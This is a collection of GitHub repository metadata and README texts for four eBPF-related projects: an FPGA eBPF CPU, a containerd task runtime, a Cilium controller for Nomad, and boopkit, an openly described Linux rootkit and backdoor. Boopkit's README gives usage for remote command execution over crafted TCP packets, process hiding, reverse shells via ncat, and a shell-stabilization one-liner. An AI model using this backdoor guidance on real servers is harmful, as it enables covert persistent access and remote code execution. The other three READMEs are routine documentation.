kris-nova/boopkit,1636,182,1636,13,C,"Linux eBPF backdoor over TCP. Spawn reverse shells, RCE, on prior privileged access. Less Honkin, More Tonkin.",2022-03-30T12:33:29Z,2025-10-10T08:14:22Z,248,"```
================================================================

    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘â•šâ•â•â–ˆâ–ˆâ•”â•â•â•
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘   
    â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â•  â•šâ•â•â•â•â•â• â•šâ•â•     â•šâ•â•  â•šâ•â•â•šâ•â•   â•šâ•â•   
    Author: Kris NÃ³va <kris@nivenly.com> Version 1.4.0
    
    IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE 
    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, 
    EXEMPLARY, OR CONSEQUENTIAL DAMAGES.    

    DO NOT ATTEMPT TO USE THE TOOLS TO VIOLATE THE LAW.
    THE AUTHOR IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTION.
    MISUSE OF THE SOFTWARE, INFORMATION, OR SOURCE CODE
    MAY RESULT IN CRIMINAL CHARGES.
    
    Use at your own risk.

================================================================

Boopkit.
Linux rootkit and backdoor. Built using eBPF.

Usage: 
boopkit [options]

Options:
-h, help           Display help and usage for boopkit.
-i, interface      Interface name. lo, eth0, wlan0, etc
-s, sudo-bypass    Bypass sudo check. Breaks PID obfuscation.
-r, reverse-conn   Attempt a reverse RCE lookup if no payload found.
-q, quiet          Disable output.
-x, reject         Source addresses to reject triggers from.

```

Linux backdoor, rootkit, and eBPF bypass tools.
Remote command execution over raw TCP.

 - Tested on Linux kernel 5.16
 - Tested on Linux kernel 5.17
 - Remote code execution over TCP (SSH, Nginx, Kubernetes, etc)
 - Network gateway bypass (bad checksums, TCP reset)
 - Self obfuscation at runtime (eBPF process hiding)

##### Disclaimer

> This is **NOT** an exploit! This requires prior privileged access on a server in order to work!
> I am a professional security researcher. These are white hat tools used for research purposes only.
> Use this responsibly. Never use this software illegally.

![FSpgEXTacAYme8t](https://user-images.githubusercontent.com/13757818/168698377-9c1125d6-698d-4009-a599-56b275b54764.jpeg)

## Server Side

Download and build boopkit.

```bash
wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.3.0.tar.gz
tar -xzf v1.3.0.tar.gz 
cd boopkit-1.3.0/
make
sudo make install
```

Run boopkit in the foreground. 

```bash 
# Reject all boops on localhost and 10.0.0.1
boopkit -x 127.0.0.1 -x 10.0.0.1
```

Run boopkit in the background in quiet mode.

```bash 
# Danger! This can be VERY hard to stop! Run this at your own risk!
boopkit -q &
```

Boopkit is now running and can be exploited using the client `boopkit-boop` command line tool.

## Client Side

Download and build boopkit.

```bash
wget https://github.com/kris-nova/boopkit/archive/refs/tags/v1.2.0.tar.gz
tar -xzf v1.2.0.tar.gz 
cd boopkit-1.2.0/
make
sudo make install
```
Run boopkit-boop against the server.

```bash 
# ===================
RCE=""ls -la""
# ===================
LHOST=""127.0.0.1""
LPORT=""3535""
RHOST=""127.0.0.1""
RPORT=""22""
boopkit-boop \
  -lhost $LHOST \
  -lport $LPORT \
  -rhost $RHOST \
  -rport $RPORT \
  -c ""$RCE""
```

# Boop Vectors

Boopkit will respond to various events on the network. Both of which can be triggered with the `boopkit-boop` tool.

TCP Header Format. Taken from [RFC 793](https://datatracker.ietf.org/doc/html/rfc793#section-3.1). September 1981
```
        0                   1                   2                   3
        0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |          Source Port          |       Destination Port        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                        Sequence Number                        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                    Acknowledgment Number                      |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |  Data |           |U|A|P|R|S|F|                               |
       | Offset| Reserved  |R|C|S|S|Y|I|            Window             |
       |       |           |G|K|H|T|N|N|                               |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |           Checksum            |         Urgent Pointer        |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       |                    Options                    |    Padding    |
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
       {                             data                              }
       {                             ....                              }
       {                             data                              }
       +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
```

### 1. Bad Checksum

First the `boopkit-boop` tool will send a malformed TCP SYN packet with an empty checksum to the server over a `SOCK_RAW` socket. This will trigger `boopkit` remotely regardless of what TCP services are running. This works against any Linux server running boopkit, regardless of the state of TCP services.

Use `-p` with `boopkit-boop` to only use this first vector.

âš ï¸ Some modern network hardware will DROP all malformed checksum packets such as the one required to exploit boopkit using this vector!

### 2. Sending ACK-RST packet

Next the `boopkit-boop` tool will complete a valid TCP handshake with a `SOCK_STREAM` socket against a remote TCP service such as SSH, Kubernetes, Nginx, etc. After the initial TCP handshake is complete, `boopkit-boop` will repeat the process a 2nd time.
The 2nd handshake will flip the TCP reset flag in the packet, trigger a TCP reset on the server.

Either of these tactics are enough to independently trigger boopkit.
Various network hardware and runtime conditions will make either tactic more viable.
Boopkit will try both, and respond to both by default.

# Boopscript

The `boopscript` file is a [Metasploit](https://github.com/rapid7/metasploit-framework) compatible script that can be used to remotely trigger the boopkit backdoor after `boopkit-boop` is installed on a remote Linux machine.

```bash
# boopscript
RHOST=""127.0.0.1""
RPORT=""22""
LHOST=""127.0.0.1""
LPORT=""3535""

NCAT=""/usr/bin/ncat""
NCATLISTENPORT=""3545""
```

### Compile Time Dependencies 

 - 'clang' 
 - 'bpftool'   Required for `libbpf`
 - 'xdp-tools' Required for `libxdp`
 - 'llvm'
 - 'pcap'
 - 'lib32-glibc'

### Reverse Shell Stabilization

```bash
python -c ""import pty; pty.spawn('/bin/bash')""
```

### References

 - [Tracepoints with BPF](https://lwn.net/Articles/683504/)
 - [Raw TCP Sockets](https://github.com/MaxXor/raw-sockets-example)
 - [Bad BPF](https://github.com/pathtofile/bad-bpf)

Credit to the original authors for their helpful code samples! I forked a lot of code for this project! 
"
rprinz08/hBPF,420,25,420,0,Python,hBPF = eBPF in hardware,2021-04-03T11:24:04Z,2025-10-07T09:06:40Z,51,"# hBPF = eBPF in hardware

![](doc/images/hbpf-logo-l.png)

An [extended Berkley Packet Filter (eBPF)](https://ebpf.io/)
CPU written entirely in [Python3](https://www.python.org/)
for PC and FPGA.

## History

Back in 1992 the original [Berkeley Packet Filter (BPF)](http://www.tcpdump.org/papers/bpf-usenix93.pdf)
was designed
for capturing and filtering network packets that matched
specific rules. Filters are implemented as programs to be run
on a register-based virtual RISC machine providing a small
number of instructions inside the Linux Kernel.

Soon it became clear that extending the Kernel by
user-supplied programs proves to be useful. But the design of
the virtual machine e.g instruction set (ISA) or register
width (32-bit vs. 64-bit) couldn't keep up with the demands.

At some point [in 2014](https://lwn.net/Articles/599755/),
work to extend the existing BPF virtual machine started to
make it useful in other parts of the Linux Kernel. More,
wider registers, additional instructions and a JIT eventually
resulted in [extended BPF](https://ebpf.io/). The original
and now obsolete BPF version has been retroactively renamed
to __classic BPF (cBPF)__. Nowadays, the Linux Kernel runs
eBPF only and loaded cBPF bytecode is transparently
translated into eBPF before execution.

Further information can be found in the
[eBPF specification](https://github.com/ebpffoundation/ebpf-docs) or in the [Linux Kernel documentation](https://docs.kernel.org/bpf/index.html).

The *hBPF* project now implements most of eBPF features in
hardware (FPGA).

## Goals

This project was started beginning of 2021 as an experiment
of how fast and how far you can get, with using alternate
hardware description languages (compared to the classic 'V'
languages VHDL and Verilog), most of the time open-source
tools (compared to expensive, commercial toolchains) and
cheap development boards (e.g [Arty-S7](https://reference.digilentinc.com/reference/programmable-logic/arty-s7/start)).

It is not meant to compete with multi-core accelerator cards
like [Xilinx Alveo](https://www.xilinx.com/products/boards-and-kits/alveo.html), instead its used to gain
insights and perform experiments.

## Current State

* All unit-tests pass
* Can process binaries created with assembler or C (LLVM) without any changes
* Partially optimized
    * This is a constant work in progress ...
    * Statistic information per test case is collected as described [here](doc/statistics.md).
    * Clock cycles per op-code are [available here](doc/opcodes.md).

  Many op-codes require 1 clock cycle, jumps (conditional and unconditional) require 2 clock cycles and math op-codes like `mod` or `div` require the most clock cycles to complete.

* no stack

Additional infos can be found in the [Blog](https://www.min.at/hbpf).

Tested with:

Migen Git commit: 9a0be7a4210ff96043412539eb5388659b81831d

LiteX Git commit: 85d6cb4b8df98730bd83b412dff6108df188bbb4

LiteETH Git commit: 7acb2a8c1c1abda63496d422d093dc6bbfe135a8

*Note: Ensure that you build hBPF with above Git commits of LiteX/Migen dependencies.*

## Installation

The following instructions gets you going, assuming no
requirements are installed on your system. If some of the
required components are already available then skip the
corresponding steps or packages.

```bash
# Install system dependencies (assuming Debian based distro)
$ sudo apt install git curl clang llvm python3-pip make xxd \
                   libpcap0.8-dev libbpf-dev openocd
# If you prefer 'hexdump' over of 'xxd'...
$ sudo apt install bsdmainutils
```

```bash
# For ubpf which uses python2
$ sudo apt install python-pip
$ pip install --user -r tools/ubpf/requirements.txt
```

```bash
# Python3 dependencies
$ pip3 install --user colour_runner
$ pip3 install --user git+https://github.com/javawizard/parcon
```

*Note: Included submodule `ubpf` requires Python Parcon module. Dont install Parcon via
`pip3 install --user parcon` but install directly from git via
`pip3 install --user git+https://github.com/javawizard/parcon` as shown
above.*

*Note: Depending on your installed Python version (e.g. > 3.7) there might be
an issue with Parcon module from git repo. In this case you will get
`dummy_threading` errors when building. There is a
[pull request #22](https://github.com/javawizard/parcon/pull/22) which
fixes this. Alternatively you can install Parcon with:*

```bash
$ pip3 install --user git+https://github.com/rprinz08/parcon
```

```bash
# Install rust - needed to compile tools
# See additional infos at:
# https://www.rust-lang.org/tools/install
$ curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
$ source $HOME/.cargo/env
```

```bash
# Create project root folder (e.g. projects)
$ mkdir -p projects
$ cd projects
```

```bash
# Install Litex
# See additional infos at:
# https://github.com/enjoy-digital/litex
$ mkdir litex
$ cd litex
$ curl -o litex_setup.py https://raw.githubusercontent.com/enjoy-digital/litex/master/litex_setup.py
$ chmod +x litex_setup.py
$ ./litex_setup.py init install --user
```

```bash
# Install hBPF
$ cd ..
$ git clone https://github.com/rprinz08/hBPF.git
$ cd hbpf
$ git submodule init
$ git submodule update
```

```bash
# Compile Tools
$ cd tools/rust-cbpf
$ cargo build
$ cd ../wishbone-utils/wishbone-tool
$ cargo build
```

```bash
# run Tests in tests folder
$ cd ../../../tests

# Test CPU emulator:
# This completes fast
$ ./test_vm.py

# Test FPGA simulation:
# This takes time ......
$ ./test_fpga_sim.py

# Test hardware:
# This needs an FPGA board ....
# (ensure that you change the configuration at the top of this
# file to match your target hardware)
$ ./test_fpga_hw.py
```

For working with hardware you need in addition to the above,
a toolchain which supports your board/target.
This project includes two boards/targets from
Xilinx so to build the FPGA bitstreams yourself
you have to install [Xilinx Vivado](https://www.xilinx.com/products/design-tools/vivado.html).

*Note: Prebuilt bitstreams for included targets are provided.*

## Overview

The main purpose of implementing an eBPF CPU in hardware is
the same as that of the original cBPF: processing network
packets.

By attaching a hBPF CPU directly to a network PHY/MAC a form
of a [smart NIC](https://blog.mellanox.com/2018/08/defining-smartnic/) could be created. Such a NIC is capable
to perform tasks on packets offloaded by the host CPU for
performance reasons.

But a hBPF CPU has most necessary features so it can even be
used standalone as a simple microcontroller.

The following picture shows an overview of how hBPF can be
used.

![hBPF overview](doc/images/hbpf-overview.png)

hBPF is implemented using the [LiteX](https://github.com/enjoy-digital/litex)
SoC builder framework. LiteX itself is based on [Migen](https://github.com/m-labs/migen), a toolbox to create FPGA designs in Python3.

![hBPF CPU](doc/images/cpu.png)

The hBPF CPU has access to separated program- and data-memory
([Harvard architecture](https://en.wikipedia.org/wiki/Harvard_architecture)).
Data-memory (8-Bit) holds network
packets (defaults to 2048 bytes) which are processed based on the
instructions in program memory (64-Bit, defaults to 1024 bytes).

At the moment the `/reset` signals goes HIGH,
the CPU starts processing instructions read
from program memory.
When processing the `exit` instruction, the `halt`
signal goes high and the CPU stops processing
instructions. Whenever an error occurs (e.g
division by 0, invalid instruction etc.) the
`error` signal is set HIGH and the CPU stops
processing instructions setting signal `halt`
HIGH as well.

Registers R1 - R5 are not cleared on reset and can be used
as input arguments to a program, register R0 is used to
return something. The same mechanism is also used when
calling FPGA extensions by using [call-handlers](doc/call_handler.md).

When CPU starts, internal `ticks` register is
cleared and incremented every clock tick until CPU
halts which can be used to measure execution speed.

The **math.divider** submodule contains decimal divider and
the **math.shifter** a left/right shifter including arithmetic
shifts.

The project includes the following components:

### Emulator

To get a better understanding of how eBPF works an emulator
was developed in Python3. It implements a complete eBPF CPU
in Python and was a playground to try out concepts and
experiment with opcodes. The emulator code itself is not used
in the FPGA implementations.

### Simulator

The FPGA implementation of hBPF was done using LiteX and Migen
tools. The same Python3 code which later is converted
to Verilog can be tested with the simulation capabilities
from LiteX.

### FPGA Implementations

The LiteX hBPF implementation can be converted to
Verilog and processed by toolchains for various
target devices and boards. Included are three real
hardware implementations for Xilinx devices
(Spartan7, Artix7 and Zynq) on
[Arty-S7](https://digilent.com/reference/programmable-logic/arty-s7/start),
[Arty-A7](https://digilent.com/reference/programmable-logic/arty-a7/start) and
[Zybo-Z7](https://digilent.com/reference/programmable-logic/zybo-z7/start) boards.

Based on the following overview, they can be used to
test and debug hBPF and also to run the HW
unit-tests as described under *testing* further
down. They are not connected to an Ethernet PHY/MAC at the moment. Next samples will show how to use LiteETH to process real network packets.

![test-overview](doc/images/hbpf-debug-overview.png)

Each implementation requires about 10500 LUTs
including Wishbone Bridge and LiteScope Debugger.
The CPU core alone requires about 8000 LUTs. Both
implementations were tested with 100MHz.

### Deviations from eBPF

In contrast to the eBPF implementation used in the Linux
Kernel, hBPF has some deviations and differences.

#### Calls

In eBPF, the `call` instruction is used to call selected
subroutines in the Linux Kernel (so called *Helper Functions*). In the hBPF implementation, the `call` opcode can be used to extend the CPU by means of [call-handlers](doc/call_handler.md).

#### Register R1

In the Linux eBPF implementation register R1 is used as base
pointer to the data-memory. This is not necessary for hBPF so
register R1 is used as input argument just as R2 - R5.

#### Stack

Not supported at the moment.

## Development

This section is divided in two parts:

* Developing hBPF

    describes how to develop hBPF itself, modifying or extending it.

* Developing for hBPF

    describes how to develop software which runs on a hBPF (or eBPF) CPU.

## Developing hBPF

### Requirements

hBPF is completely written in Python3 and uses the following tools:

* [Python3](https://www.python.org/)
* [LiteX](https://github.com/enjoy-digital/litex)
* [userspace BPF (uBPF)](https://github.com/iovisor/ubpf)
* [cbpf-rust](https://github.com/mmisono/rust-cbpf)
* [wishbone-utils](https://github.com/litex-hub/wishbone-utils)
* FPGA Toolchain (e.g. [Xilinx Vivado](https://www.xilinx.com/products/design-tools/vivado.html))
* [OpenOCD](http://openocd.org/) to load/flash FPGA targets (can normally be done by toolchain but OpenOCD is simpler and faster)
* [VS-Code](https://code.visualstudio.com/) as IDE and Test-runner

### Building

Assuming you have all prerequisites installed and their
binaries are available via search path, perform the following
steps:

1. check out hBPFs Git repository

2. open hBPF repository folder in VS-Code

   * start developing

3. run unit-tests either inside VS-Code or direct from the command line.

4. to build an FPGA bitstream for a real hardware target, select a target in `source/fpga/hw` folder and run `build.py`.

### Testing

All three hBPF implementations can be tested using
comprehensive unit-tests. All based on the same set of test
cases. To accomplish this, the Python based eBPF assembler of
the [userspace BPF (uBPF)](https://github.com/iovisor/ubpf) project is used.

Unit-tests can either be run from inside VS-Code or direct
from command line in `tests` folder.

* `test_vm.py` - run test cases against emulated CPU (fast)
* `test_fpga_sim.py` - runs tests against simulated FPGA design (takes long, be patient)
* `test_fpga_hw.py` - runs test-cases against hBPF CPU running on real hardware via a serial Wishbone bridge (medium fast)

Each test-case consists of a file in the `test` (or one of
its sub-folders) folder. Test files are text files with a `.test` file extension. It consists of sections starting with
`--` describing the test. The following test description shows
a Fibonacci test with an `asm` section which is compiled on
the fly before the test is executed, an `args` section which
defines the input values, a `result` section defining whats
expected in register R0 after test completes and an `expected`
section which defines additional criteria that must be
met like the number of clock cycles the test may take.

```asm
# Example test case description. Calculating the Fibonacci
# for provided input in register R1
-- asm
mov r0, r1
jeq r1, 0, +11
jeq r1, 1, +9
mov r3, 0
mov r0, 1
mov r2, 2
mov r4, r0
add r0, r3
add r2, 1
mov r3, r4
jgt r2, r1, +2
ja -6
mov r0, 1
exit
-- args
r1 = 9
-- result
0x22
-- expected
clocks = 324
```

Also available are a `raw` section which describes a test
program as hex dump and a `mem` section which describes the
data-memory as hex dump.

Before executing a test the `asm` section is compiled to
binary and sent to the device under test (either the
emulator, simulator or hardware). For real hardware this is
done using the Wishbone serial bridge. If a `raw` section is
found in the test description it is sent after converting to
binary from hex dump. Also the data-memory is loaded from the
`mem` section contents if available.

Next input registers R1-R5 are set according to `args`
section. If section is not available or some
registers are not set in section then they are set to 0. To
start the test the hBPF CPU is brought out of reset by
setting `RESET_N` signal to HIGH and monitoring hBPF CPU
signals until `HALT` signal goes high or expected clocks
(when not specified default clocks = 1000) are reached. Then
control signals and output register R0 are compared against
the test definition.

In addition, statistic information per test case is collected as described
[here](doc/statistics.md).

## Developing for hBPF

The existing eBPF development tools (compilers, assemblers,
filters) can be used to develop for hBPF. Samples can be found
in the `development` directory.

## Hardware targets and examples

Some examples on the included targets are provided:

hBPF development targets
* [Arty S7](source/fpga/hw/arty-s7-50/readme.md)
* [Arty A7](source/fpga/hw/arty-a7-100/readme.md)
* [Zybo Z7](source/fpga/hw/zybo-z7-20/readme.md)

Packet processing with LiteETH and hBPF
* [Arty S7 MultiNIC](source/fpga/hw/arty-s7-50-nic/readme.md)
* [Arty A7 Network](source/fpga/hw/arty-a7-100-net/readme.md)

## Misc

This project is by no means complete or error free or
production ready. Fe"
fuweid/embedshim,120,13,120,11,Go,Provide task runtime implementation with pidfd and eBPF sched_process_exit tracepoint to manage deamonless container with low overhead.,2022-02-20T10:09:03Z,2025-09-30T19:58:32Z,82,"# embedshim

> Update: containerd
> [removes shim.v1 interface](https://github.com/containerd/containerd/pull/8262)
> and introduces
> [sandbox API](https://github.com/containerd/containerd/issues/9431). This
> project will be migrated into standalone sandbox API after containerd 2.0
> releases.

The embedshim is the kind of task runtime implementation, which can be used as
plugin in containerd.

With current shim design, it is used to manage the lifecycle of container
process and allow to be reconnected after containerd restart. The one of the key
design elements of a small shim is to be a container process monitoring, at
least it is important to containerd created by runC-like runtime.

Without pidfd and ebpf trace point feature, it is unlikely to receive exit
notification in time and receive exit code correctly as non-parents after shim
dies. And in kubernetes infra, even if the containers in pod can share one shim,
the VmRSS of shim(Go Runtime) is still about 8MB.

So, this plugin aims to provide task runtime implementation with pidfd and eBPF
sched_process_exit tracepoint to manage deamonless container with low overhead.

![embedshim-overview](docs/images/embedshim-overview.svg)

[![asciicast](https://asciinema.org/a/480970.svg)](https://asciinema.org/a/480970)

## Build/Install

The embedshim needs to compile bpf with clang/llvm. So install clang/llvm as
first.

```bash
$ echo ""deb http://apt.llvm.org/focal/ llvm-toolchain-focal main"" | sudo tee -a /etc/apt/sources.lis
$ wget -O - https://apt.llvm.org/llvm-snapshot.gpg.key | sudo apt-key add -
$ sudo apt-get update -y
$ sudo apt-get install -y g++ libelf-dev clang lld llvm
```

And then pull the repo and build it.

```bash
$ git clone https://github.com/fuweid/embedshim.git
$ cd embedshim
$ git submodule update --init --recursive
$ make
$ sudo make install
```

The binary is named by `embedshim-containerd` which has full functionality in
linux. You can just replace your local containerd with it.

```bash
$ sudo install bin/embedshim-containerd $(command -v containerd)
$ sudo systemctl restart containerd
```

And check plugin with `ctr`

```bash
$ ctr plugin ls | grep embed
io.containerd.runtime.v1        embed                    linux/amd64    ok
```

## Status

The embedshim supports to run container in headless or with input. But it still
works in progress, do not use in production.

* [ ] Task Event(Create/Start/Exit/Delete/OOM) support

## Requirements

* raw tracepoint bpf >= kernel v4.18
* CO-RE BTF vmlinux support >= kernel v5.4
* pidfd polling >= kernel v5.3

## License

* The user space components are licensed under
  [the Apache License, Version 2.0](LICENSE).
* The BPF code are under
  [the General Public License, Version 2.0](bpf/COPYING).
"
cosmonic/netreap,139,8,139,15,Go,A Cilium controller implementation for Nomad,2023-05-02T12:55:30Z,2025-07-15T17:29:21Z,50,"![netreap-social](https://github.com/cosmonic-labs/netreap/assets/1687902/681901f1-8717-43d3-87e1-311e7a5baf83)

# Netreap

Netreap is a non-Kubernetes-based tool for handling Cilium across a cluster,
similar to the functionality of [Cilium
Operator](https://docs.cilium.io/en/v1.13/internals/cilium_operator/#cilium-operator-internals).
It was originally designed just to reap orphaned Cilium
[Endpoints](https://docs.cilium.io/en/v1.13/gettingstarted/terminology/#endpoints),
hence the name of `Netreap`. But we loved the name so much we kept it even
though it does more than reaping.

## So why does this exist?

The current [Cilium
Operator](https://github.com/cilium/cilium/tree/master/operator) only works for
Kubernetes and even when we tried to fork it, Kubernetes was too deeply
ingrained to just pull it out, so we created this little project. This helps
clean up nodes that no longer exist from the KV store, and deletes any
endpoints that no longer have services. Ideally, we will want to make this more
generic and open source so other people can take advantage of this work.

## Running

Instructions for running and configuring Netreap are found below. Please note
that Netreap uses leader election, so multiple copies can (and should) be run.

### Installing

#### Requirements

* A Consul cluster or server
* A running Nomad cluster
* Cilium 1.12.x or 1.13.x
  * You will also need to install the [CNI
    plugins](https://github.com/containernetworking/plugins/releases/tag/v1.2.0)
    alongside Cilium

As of v0.2.0 Consul is no longer required for endpoint reconciliation in
Cilium. You may chose to continue to use Consul as Cilum's KV store, but you
can also use etcd. The install guide assumes you want to use Consul as the
kvstore, since you will need it to distribute Cilium policies.

#### Running Cilium

Due to the way Nomad fingerprinting currently works, you _cannot_ run Cilium as
a system job to provide the CNI plugin. This means you'll need to configure and
run it yourself on every agent that you want to include in the Cilium mesh.

##### Iptables

Make sure that iptables is properly configured on the host:

```bash
cat <<'EOF' | sudo tee /etc/modules-load.d/iptables.conf
iptable_nat
iptable_mangle
iptable_raw
iptable_filter
ip6table_mangle
ip6table_raw
ip6table_filter
EOF
```

##### Cilium Agent

Since you can't run Cilium as a Nomad job right now, the easiest way to run it
is to just use systemd. You can run and enable a job similar to the following:

```systemd
[Unit]
Description=Cilium Agent
After=docker.service
Requires=docker.service
After=consul.service
Wants=consul.service
Before=nomad.service

[Service]
Restart=always
ExecStartPre=-/usr/bin/docker exec %n stop
ExecStartPre=-/usr/bin/docker rm %n
ExecStart=/usr/bin/docker run --rm --name %n \
  -v /var/run/cilium:/var/run/cilium \
  -v /sys/fs/bpf:/sys/fs/bpf \
  --net=host \
  --cap-add NET_ADMIN \
  --cap-add NET_RAW \
  --cap-add IPC_LOCK \
  --cap-add SYS_MODULE \
  --cap-add SYS_ADMIN \
  --cap-add SYS_RESOURCE \
  --privileged \
  cilium/cilium:v1.13.1 \
  cilium-agent --kvstore consul --kvstore-opt consul.address=127.0.0.1:8500 \
    --enable-ipv6=false -t geneve \
    --enable-l7-proxy=false  \
    --ipv4-range 172.16.0.0/16

[Install]
WantedBy=multi-user.target
```

Note that this actually runs Cilium with Docker! The reason for this is that
Cilium uses forked versions of some key libraries and needs access to a C
compiler. We found that it is easier to just the container instead of
installing all of Cilium's dependencies.

If you use Consul ACLs, then you will need to add a token to the `Service`
block in the systemd unit so that Cilium can connect to the cluster.

```systemd
[Service]
Environment=""CONSUL_HTTP_TOKEN=...""
```

#### Configuring the CNI

The big thing to note is that you need to make sure that the IP CIDR you use
for Cilium does _not_ conflict with what Docker uses if you're using Docker. If
it does or if you want to change Docker's IP range, take a look at the
`default-address-pools` option in `daemon.json`, ex.

```json
{
  ""default-address-pools"": [
    {
      ""base"": ""192.168.0.0/24"",
      ""size"": 24
    }
  ]
}

```

You will then need to make sure you have a CNI configuration for Cilium in
`/opt/cni/config` named `cilium.conflist`:

```json
{
  ""name"": ""cilium"",
  ""cniVersion"": ""1.0.0"",
  ""plugins"": [
     {
       ""type"": ""cilium-cni"",
       ""enable-debug"": false
     }
  ]
}
```

Ensure that the Cilium CNI binary is available in `/opt/cni/bin`:

```bash
sudo docker run --rm --entrypoint bash -v /tmp:/out cilium/cilium:v1.13.1 -c \
  'cp /usr/bin/cilium* /out; cp /opt/cni/bin/cilium-cni /out'
sudo mv /tmp/cilium-cni /opt/cni/bin/cilium-cni
# Optionally install the other Cilium binaries to /usr/local/bin
sudo mv /tmp/cilium* /usr/local/bin

```

### Running Netreap

Run Netreap as a system job in your cluster similar to the following:

```hcl
job ""netreap"" {
  datacenters = [""dc1""]
  priority    = 100
  type        = ""system""

  constraint {
    attribute = ""${attr.plugins.cni.version.cilium-cni}""
    operator = ""is_set""
  }

  group ""netreap"" {
    restart {
      interval = ""10m""
      attempts = 5
      delay = ""15s""
      mode = ""delay""
    }
    service {
      name = ""netreap""
      tags = [""netreap""]
    }

    task ""netreap"" {
      driver = ""docker""

      config {
        image        = ""ghcr.io/cosmonic/netreap:0.2.0""
        network_mode = ""host""

        # You must be able to mount volumes from the host system so that
        # Netreap can use the Cilium API over a Unix socket.
        # See
        # https://developer.hashicorp.com/nomad/docs/drivers/docker#plugin-options
        # for more information.
        volumes = [
          ""/var/run/cilium:/var/run/cilium""
        ]
      }

    }
  }
}
```

The job constraint ensures that Netreap will only run on nodes where the
Cilium CNI is available.

If you use Nomad or Consul ACLs then you will need to set them in the Netreap
job, ex.

```hcl

      template {
        destination = ""secrets/file.env""
        env         = true
        change_mode = ""restart""
        data        = <<EOT
CONSUL_HTTP_TOKEN=""...""
NOMAD_TOKEN=""...""
EOT
      }
```

Note that all environment variables used to configure the Consul and Nomad API
clients are available to Netreap.

### Configuring

| Flag                   | Env Var               | Default                       | Description                                                                                                   |
| ---------------------- | --------------------- | ----------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `--debug`              | `NETREAP_DEBUG`       | `false`                       | Turns on debug logging                                                                                        |
| `--policy-key`         | `NETREAP_POLICY_KEY`  | `netreap.io/policy`           | Consul key that Netreap watches for changes to the Cilium policy JSON value |

Please note that to configure the Nomad, Consul and Cilium clients that Netreap uses,
we leverage the well defined environment variables for
[Nomad](https://www.nomadproject.io/docs/commands#environment-variables),
[Consul](https://www.consul.io/commands#environment-variables) and
[Cilium](https://pkg.go.dev/github.com/cilium/cilium/pkg/client#DefaultSockPath).

Right now we only allow connecting to the local Unix socket endpoint for the
Cilium agent. As we determine how we are going to set things up with Cilium, we
can add additional configuration options.

### Cilium Policies

One of Netreap's key responsibilities is to sync [Cilium
policies](https://docs.cilium.io/en/stable/security/policy/) to every node in
your Cilium mesh. Normally Cilium policies are configured using Kubernetes
CRDs, but we don't have that option when we're running Nomad. Normally Cilium
combines all of the CRD values in to a single JSON representation which is
imported by every agent. What this means is that Netreap does the same thing by
watching a single Consul key that stores the complete JSON representation of
all of the Cilium policies in your cluster. The official documentation has
examples on how to write policies in JSON.

Whenever you want to update policies in your cluster, simply set the key in
Consul:

```bash
consul kv put netreap.io/policy @policy.json
```

Netreap automatically picks up any updates to the value and updates the policy
on every node where it is running.

